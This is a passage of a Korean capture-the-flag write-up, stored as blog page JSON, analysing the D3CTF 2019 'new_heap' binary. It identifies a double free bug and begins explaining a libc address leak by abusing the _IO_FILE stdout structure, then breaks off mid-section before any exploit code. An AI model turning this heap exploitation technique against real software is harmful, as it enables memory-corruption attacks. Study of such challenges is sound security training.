{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/d3ctf2019_new_heap_ctf_writeup/",
    "result": {"data":{"cur":{"id":"812e049c-90ef-548b-ab1c-ca8d05b7f5d2","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-개요\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\" aria-label=\"바이너리 개요 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 개요</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">new_heap<span class=\"token punctuation\">:</span> ELF <span class=\"token number\">64</span><span class=\"token operator\">-</span>bit LSB shared <span class=\"token builtin\">object</span>\nx86<span class=\"token operator\">-</span><span class=\"token number\">64</span> version <span class=\"token number\">1</span> <span class=\"token punctuation\">(</span>SYSV<span class=\"token punctuation\">)</span>\ndynamically linked\ninterpreter <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span>\n<span class=\"token keyword\">for</span> GNU<span class=\"token operator\">/</span>Linux <span class=\"token number\">2.6</span><span class=\"token number\">.32</span>\nBuildID<span class=\"token punctuation\">[</span>sha1<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>d8a6eae195909da34581c15b13d84d41ebeeab2e\nstripped\n\nlinux<span class=\"token operator\">-</span>vdso<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">1</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7ffb000</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token operator\">/</span>lib<span class=\"token operator\">/</span>x86_64<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>gnu<span class=\"token operator\">/</span>libc<span class=\"token punctuation\">.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff77e1000</span><span class=\"token punctuation\">)</span>\n\t\t\t\t\t   <span class=\"token operator\">/</span>lib64<span class=\"token operator\">/</span>ld<span class=\"token operator\">-</span>linux<span class=\"token operator\">-</span>x86<span class=\"token operator\">-</span><span class=\"token number\">64.</span>so<span class=\"token punctuation\">.</span><span class=\"token number\">2</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x00007ffff7dd5000</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"보호-기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\" aria-label=\"보호 기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호 기법</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">[</span><span class=\"token operator\">*</span><span class=\"token punctuation\">]</span> <span class=\"token string\">'/home/Zer0Luck/challenges/new_heap/new_heap'</span>\n    Arch<span class=\"token punctuation\">:</span>     amd64<span class=\"token operator\">-</span><span class=\"token number\">64</span><span class=\"token operator\">-</span>little\n    RELRO<span class=\"token punctuation\">:</span>    Full RELRO\n    Stack<span class=\"token punctuation\">:</span>    Canary found\n    NX<span class=\"token punctuation\">:</span>       NX enabled\n    PIE<span class=\"token punctuation\">:</span>      PIE enabled</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 655px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 67.22222222222223%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA+ElEQVQoz52R227DIBBE+f9frKJKvcRpXLAddmFvQIQtRWnlh7qjeVuOZod1U1QEpdxM255qa6Wubq2Walqk26RWc+8Df36I91R/q4Mo6Tv5K1xHGJPmyDDi6FMIKYCg8zONI4jY+vyYXOIyBTuf2+WiMRaz8jxm45nmhRY2XjvUhztMVpdZTqc8DLIsReQHLEVAABikyF6y9OQ1Vg+vHZPGm4hqZtpaM/Mf+/e1p1BfXuPbcIPIgKJqjzEphRQmmuY878BIBiDXL0loqv3DnmNLLVp08w58S+Y9xWiIRnSstoNsiDXGhliOntrFZO2/cll72nb4o/Adkhv/Zw+c6wcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png\"\n        srcset=\"/static/7d27dc209a6ccc4d097443af38f803ca/e9ff0/0.png 180w,\n/static/7d27dc209a6ccc4d097443af38f803ca/f21e7/0.png 360w,\n/static/7d27dc209a6ccc4d097443af38f803ca/ae6b7/0.png 655w\"\n        sizes=\"(max-width: 655px) 100vw, 655px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">print_menu</code> 함수를 바탕으로 1.alloc, 2. free, 3. exit 조건을 수행하는 것을 확인할 수 있다.</li>\n</ul>\n<h2 id=\"alloc\" style=\"position:relative;\"><a href=\"#alloc\" aria-label=\"alloc permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>alloc</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 642px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 61.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAAsTAAALEwEAmpwYAAABMElEQVQoz5WS627bMAyF/f6vuLbDMm9x4ljVhTRvIjW4CJYBG4aUPwQBR58Ob9OyFmiAuANgrU3VxtMxXbZ9nvOy8LrqumpKg2hEPAdf36lkTolai5xHKR0gmO9yj46KVWrlioogAArHRYGNp1sW2pW5p81aG0Qm0t3v1uYGCgcslYyaNBA4Tj1+mVA8bX7Z2lbziPGpmMi85LiupF3is/D67rU4SKvIpuN3wk/BP6/+8iXmM88/+HSyWvVPOSLMzcI83MP/dpacO+JA0G0Ts+H+GJV0ObfzAkvaU5GCgt37A657vL2O1xPM6fb2DUruramI9u7eh350O3NGRVRMlMwfWzQV9OXcl4u+fJXvt2sFJCIRZu5EHv/t4XRJhCBMQyU+avzHozjquAvubnY3/wWIE77JhKVD0AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png\"\n        srcset=\"/static/1065ae685e1e928c28f52c7e47c62a3f/e9ff0/1.png 180w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/f21e7/1.png 360w,\n/static/1065ae685e1e928c28f52c7e47c62a3f/1bba8/1.png 642w\"\n        sizes=\"(max-width: 642px) 100vw, 642px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>메모리 동적할당 과정을 확인해 보면 전역 포인터 배열 <code class=\"language-text\">heap_ptr</code> 에 할당하는 것을 확인할 수 있으며 인덱스 범위가 총19개까지 할당이 가능하다.</li>\n<li>사용자의 입력값이 <code class=\"language-text\">0x78</code> 이하까지 size로 할당이 되어지며 해당 사이즈 만큼 데이터를 입력 할 수 있다.</li>\n</ul>\n<h2 id=\"free\" style=\"position:relative;\"><a href=\"#free\" aria-label=\"free permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyUlEQVQY042Q3WrDMAyF8/5vsmda2dpmCWsSJ7ZsWfKfNNZ2sMEuLHQhOOdDhzNM64v10+EyscQkyBKoxlR6djj8ydk3iBUoJpaSNSftnGHZ63LT99GfP8K65Frab1lUTDSv5jS6ERKEjD4FzFFUvmEDDK5aHzcHgHH3zhPepSdMhRw7x44KQQLLFjM+4cBtnmRed2pYWsaCQEFaX+zPLV/OPF51vuF2eJF/TKLyePU45CfYYCAxF0QNHJGpNVGV3sIwNe23/4W/ALmu1IDhzGnNAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png\"\n        srcset=\"/static/1869ca93d30719e9422c46ece04e30c4/e9ff0/2.png 180w,\n/static/1869ca93d30719e9422c46ece04e30c4/f21e7/2.png 360w,\n/static/1869ca93d30719e9422c46ece04e30c4/2a195/2.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>free되는 과정을 확인해 보면 사용자의 입력 값이 곧 인덱스 범위로 사용되어 원하는 힙을 해제할 수 있으며 기본적인 길이 검증이 존재한다.</li>\n<li>하지만 해제한 초인터를 초기화하지 않기 때문에 Double Free Bug가 발생한다.</li>\n</ul>\n<h2 id=\"memory-leak-idea\" style=\"position:relative;\"><a href=\"#memory-leak-idea\" aria-label=\"memory leak idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>memory leak Idea</h2>\n<ul>\n<li>어떻게 하면 메모리 주소값을 릭할 수 있을 까?</li>\n<li>힙 청크의 데이터를 출력하는 기능이 존재하지 않아 다른 방법을 찾아야 한다.</li>\n</ul>\n<h2 id=\"_io_file_stdout\" style=\"position:relative;\"><a href=\"#_io_file_stdout\" aria-label=\"_io_file_stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>_IO_FILE_stdout</h2>\n<ul>\n<li><code class=\"language-text\">stdout</code> 파일 디스크립터는 출력할 때 주로 사용하며 구조체로 수많은 멤버 변수가 정의되어 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">int</span> _flags<span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">/* High-order word -> _IO_MAGIC, 나머지는 플래그 */</span>\n  <span class=\"token comment\">/* 다음 포인터는 C++ streambuf 프로토콜에 해당한다. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼에 대한 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 읽기 버퍼 주소의 끝을 가리키는 포인터*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_read_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of putback+get area.,\n 파일 읽기 버퍼 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼의 주소의 시작을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_ptr<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 쓰기 버퍼에 대한 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_write_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 파일 쓰기 버퍼 주소의 끝을 가리키는 포인터 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_base<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* Start of reserve area. 준비 구역의 시작 */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_buf_end<span class=\"token punctuation\">;</span>\t<span class=\"token comment\">/* 준비 구역의 끝 */</span>\n  <span class=\"token comment\">/* 다음 필드는 백업 및 실행 취소를 지원하는데 사용된다.*/</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_base<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to start of non-current get area. */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_backup_base<span class=\"token punctuation\">;</span>  <span class=\"token comment\">/* Pointer to first valid character of backup area */</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>_IO_save_end<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* Pointer to end of non-current get area. */</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_marker</span> <span class=\"token operator\">*</span>_markers<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_IO_FILE</span> <span class=\"token operator\">*</span>_chain<span class=\"token punctuation\">;</span> \n  <span class=\"token keyword\">int</span> _fileno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">int</span> _flags2<span class=\"token punctuation\">;</span>\n  __off_t _old_offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">/* This used to be _offset but it's too small.  */</span>\n  <span class=\"token comment\">/* 1+column number of pbase(); 0 is unknown. */</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> _cur_column<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">signed</span> <span class=\"token keyword\">char</span> _vtable_offset<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> _shortbuf<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span><span class=\"token operator\">~</span>_IO_lock_t <span class=\"token operator\">*</span>_lock<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">_IO_USE_OLD_IO_FILE</span></span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"stdout\" style=\"position:relative;\"><a href=\"#stdout\" aria-label=\"stdout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>stdout</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x7ffff7dd0760</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">></span><span class=\"token operator\">:</span>       <span class=\"token number\">0x00000000fbad2887</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0770</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">16</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0780</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd0790</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">48</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e3</span>      <span class=\"token number\">0x00007ffff7dd07e3</span>\n<span class=\"token number\">0x7ffff7dd07a0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">64</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x00007ffff7dd07e4</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07b0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">80</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd07c0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">96</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>    <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcfa00</span>\n<span class=\"token number\">0x7ffff7dd07d0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">112</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000001</span>      <span class=\"token number\">0xffffffffffffffff</span>\n<span class=\"token number\">0x7ffff7dd07e0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">128</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x000000000a000000</span>      <span class=\"token number\">0x00007ffff7dd18c0</span>\n<span class=\"token number\">0x7ffff7dd07f0</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">144</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0xffffffffffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0800</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">160</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00007ffff7dcf8c0</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0810</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">176</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0820</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">192</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x00000000ffffffff</span>      <span class=\"token number\">0x0000000000000000</span>\n<span class=\"token number\">0x7ffff7dd0830</span> <span class=\"token operator\">&lt;</span>_IO_2_1_stdout_<span class=\"token operator\">+</span><span class=\"token number\">208</span><span class=\"token operator\">></span><span class=\"token operator\">:</span>   <span class=\"token number\">0x0000000000000000</span>      <span class=\"token number\">0x00007ffff7dcc2a0</span></code></pre></div>\n<ul>\n<li>printf, puts와 같은 stdout 파일 디스크립터를 사용하는 함수가 호출될 때 내부적으로 <code class=\"language-text\">_IO_new_do_write</code> 함수가 호출된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAnUlEQVQI1yXH2w6CIAAAUD8mLUEBL6ggd0Sk6YNtbW39/3+06u2cTAkb0y6XbZJWuijdOutF+c2EpHwUJnDlmPIm3IUNs/HCBukiUw51Q6bX9Hi99/MpfZzNQrkahJ6kHYUZhSGUQdID3KF+JJTV7VA1FPcTJD1saMa1345zSQflEuDuWpEC4hI1JWpzgL6t8K1ucoBygP64/FBA/AF8LSgA7QDQvgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png\"\n        srcset=\"/static/ddb40862e7ea005b1c65709846244bc6/e9ff0/3.png 180w,\n/static/ddb40862e7ea005b1c65709846244bc6/f21e7/3.png 360w,\n/static/ddb40862e7ea005b1c65709846244bc6/37523/3.png 720w,\n/static/ddb40862e7ea005b1c65709846244bc6/302a4/3.png 1080w,\n/static/ddb40862e7ea005b1c65709846244bc6/0f246/3.png 1118w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">puts</code> 함수를 호출할 때 <code class=\"language-text\">_IO_new_file_xsputn</code> 함수를 호출하고 해당 함수에서 다음과 같이 <code class=\"language-text\">new_do_write</code> 함수를 호출하게 된다.</li>\n</ul>\n<h2 id=\"_io_new_file_xsputn-함수\" style=\"position:relative;\"><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\" aria-label=\"_io_new_file_xsputn 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 